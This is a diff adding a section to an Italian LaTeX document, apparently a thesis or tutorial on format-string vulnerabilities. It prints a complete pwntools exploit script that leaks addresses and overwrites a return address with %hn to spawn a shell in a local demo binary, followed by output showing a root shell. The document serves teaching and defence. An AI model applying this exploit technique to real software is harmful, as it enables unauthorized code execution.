@@ -459,3 +459,63 @@ Il payload è costituito da:
 \end{itemize}
 
 Una volta inviato il payload, la \texttt{printf} di \texttt{log\_message} termina normalmente, eseguendo la scrittura. Una volta arrivato all'istruzione \texttt{ret} però, l'esecuzione riprende da \texttt{debug\_shell} invece che da \texttt{main}, e si apre una shell. Resta da verificare che la shell così ottenuta sia davvero utilizzabile.
+
+
+\section{Fase di verifica: dalla scrittura alla shell interattiva}\label{sec:verify_phase}
+Finora abbiamo visto solo estratti di script Python. Il Codice~\ref{lst:full_exploit} riunisce per la prima volta tutti i frammenti costruiti separatamente nelle Sezioni~\ref{sec:leak_phase} e~\ref{sec:write_phase}, aggiungendo la parte rimasta finora implicita: l'apertura del processo e --- una volta inviati tutti i payload --- l'interazione vera e propria con la shell ottenuta, che è anche il modo in cui verifichiamo che l'exploit abbia davvero funzionato.
+\begin{lstlisting}[
+    language=Python,
+    gobble=4,
+    caption={Script completo dell'exploit: dalla connessione alla shell interattiva},
+    label={lst:full_exploit}
+]
+    from pwn import *
+
+    exe = ELF('./vuln_service')
+    context.binary = exe
+    io = exe.process()
+
+    payload1 = b'%9$p'
+    io.sendlineafter(b'=== MiniLog v1.0 ===\n', payload1)
+    binary_addr = int(io.recvline(), 16)
+    base_addr = binary_addr - 0x123f
+    debug_shell_addr = base_addr + 0x11c9
+
+    payload2 = b'%7$p'
+    io.sendline(payload2)
+    buf_addr = int(io.recvline(), 16)
+    ret_pos_addr = buf_addr - 8
+
+    low16 = (debug_shell_addr + 5) & 0xffff
+    spec = f'%{low16}x'.encode() \
+            + b'%12$hn'
+    pad = (-len(spec)) % 8
+    payload3 = spec + b'\x00' * pad + p64(ret_pos_addr)
+    io.sendline(payload3)
+
+    io.recvrepeat(timeout=1)
+    io.interactive()
+\end{lstlisting}
+Le prime righe hanno il compito di impostare il contesto di \texttt{pwntools} e di preparare il binario e il canale bidirezionale per comunicare con esso. L'istruzione \texttt{ELF(\textquotesingle./vuln\_service\textquotesingle)} carica il binario. \texttt{context.binary = exe} imposta poi il contesto globale di \texttt{pwntools} (architettura e ordine dei byte), che ne definisce il comportamento delle sue funzioni. L'istruzione \texttt{exe.process()} avvia infine il binario e restituisce il canale di comunicazione bidirezionale \texttt{io} già usato nelle sezioni precedenti, che permette allo script di interagire con il programma.
+
+Le ultime due righe invece gestiscono la fase finale quando tutti i payload sono stati inviati. Usiamo \texttt{io.recvrepeat(timeout=1)} per scartare l'output di decine di migliaia di caratteri provocato dal \texttt{payload3} (Sezione~\ref{sec:write_phase}): altrimenti \texttt{io.interactive()} si sarebbe attaccato subito a \texttt{stdout}, stampando a schermo tutti quei caratteri. L'istruzione \texttt{io.interactive()} inoltra invece l'input del terminale al processo e ne restituisce a schermo l'output, permettendo di interagire con la shell ottenuta e verificarne il funzionamento. Il Codice~\ref{lst:shell_proof} mostra l'output di un'esecuzione reale.
+\begin{lstlisting}[
+    language={},
+    numbers=none,
+    gobble=4,
+    caption={Output di un'esecuzione reale dell'exploit},
+    label={lst:shell_proof}
+]
+    [+] Starting local process '/poc/targets/vuln_service': pid 105
+    [*] Switching to interactive mode
+    $ id
+    uid=0(root) gid=0(root) groups=0(root)
+    $ echo "Hello, World!"
+    Hello, World!
+    $  
+\end{lstlisting}
+Abbiamo dunque ottenuto veramente una shell: l'exploit può dirsi concluso con successo.
+
+Nessuna delle protezioni di default applicate dal compilatore GCC (Codice~\ref{lst:checksec_output}) nell'ambiente di riferimento (Tabella~\ref{tab:ambiente_riferimento}) impedisce di causare leak di informazioni e di effettuare scritture in memoria. L'unica che ci avvisa del pericolo, con un warning durante la compilazione, è l'opzione di default \texttt{-Wformat-security}.
+
+Fermare questa vulnerabilità richiede protezioni pensate apposta contro la format string, non le protezioni generiche appena discusse. Il Capitolo~4 le presenta, insieme a un caso concreto in cui anche queste non sono bastate a fermare l'attacco.
